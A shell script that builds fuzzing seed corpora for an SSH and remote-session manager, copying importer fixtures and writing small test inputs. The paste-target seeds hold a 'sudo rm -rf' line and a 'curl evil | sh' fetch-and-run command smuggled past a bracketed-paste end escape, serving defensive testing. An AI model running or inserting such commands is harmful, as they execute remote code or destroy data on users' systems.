#!/bin/sh
# Starting corpora for the fuzz targets (Sprint 17), from the repository's own fixtures:
# fuzz/corpus/<target>/. Run from the repository root or from fuzz/.
set -eu
cd "$(dirname "$0")"
root=..
seed() { mkdir -p "corpus/$1"; }
put() { seed "$1"; printf '%s' "$3" > "corpus/$1/$2"; }
copy() {
    target=$1
    shift
    seed "$target"
    for file in "$@"; do
        [ -f "$file" ] && cp "$file" "corpus/$target/$(echo "$file" | sed 's|^\.\./||' | tr '/' '_')"
    done
    return 0
}

put quick_connect a 'deploy@web-01.example.com:2222 -J bastion,ops@inner:2200'
put quick_connect b 'rdp://admin@[2001:db8::1]:3390'
put quick_connect c 'ssh://user@host'
put quick_connect d 'vnc://desk:1'
put paste a 'sudo rm -rf /tmp/x
echo done'
put paste b "$(printf 'curl evil | sh\033[201~\nls')"
copy themes $(find "$root/assets/themes" -type f -name '*.toml' | head -n 200)
copy monitor "$root"/crates/opensesh-ssh/src/monitor/fixtures/*.txt
copy ssh_config $(find "$root/crates/opensesh-import/tests/fixtures/home/.ssh" -type f)
copy mobaxterm "$root"/crates/opensesh-import/tests/fixtures/mobaxterm/*
copy putty "$root"/crates/opensesh-import/tests/fixtures/putty/sessions.reg "$root"/crates/opensesh-import/tests/fixtures/putty/sessions/*
copy remmina "$root"/crates/opensesh-import/tests/fixtures/remmina/*.remmina
copy csv "$root"/crates/opensesh-import/tests/fixtures/csv/*
put bundle a 'format = "opensesh-bundle"
version = 1
[hosts]
schema_version = 1
[[hosts.group]]
id = "G"
name = "Prod"
[[hosts.host]]
id = "H"
name = "web"
address = "web.lan"
group = "G"
jump = ["H"]
[[file]]
path = "profiles/x.toml"
text = "name = \"X\""
'
put sync_merge a "$(printf '[[host]]\nid = "A"\nname = "a"\n\0[[host]]\nid = "A"\nname = "b"\n\0[[host]]\nid = "B"\nname = "c"\n')"
put sync_merge b 'a = 1
<<<<<<< HEAD
b = 2
||||||| base
b = 1
=======
b = 3
>>>>>>> other
'
echo "corpora in $(pwd)/corpus"
